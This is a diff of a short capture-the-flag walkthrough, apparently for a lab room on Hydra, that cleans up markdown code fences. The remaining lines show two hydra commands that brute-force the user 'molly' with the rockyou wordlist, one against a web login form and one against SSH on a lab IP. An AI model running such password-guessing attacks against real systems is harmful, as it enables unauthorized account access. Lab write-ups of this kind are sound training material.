@@ -36,12 +36,8 @@ Run the following command, the password should be cracked in less than one minut
 
 
 ```
-```
 root@kali:~/Desktop# hydra -l molly -P rockyou.txt 10.10.86.187 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 ```
-```
-
-
 ### Flag 2
 
 
@@ -49,10 +45,7 @@ Start bruteforcing the ssh password then logon via ssh as molly to grab the flag
 
 
 ```
-```
 root@kali:~/Desktop# hydra -l molly -P rockyou.txt 10.10.86.187 -t 4 ssh
 ```
-```
-
 
 Thanks for reading!
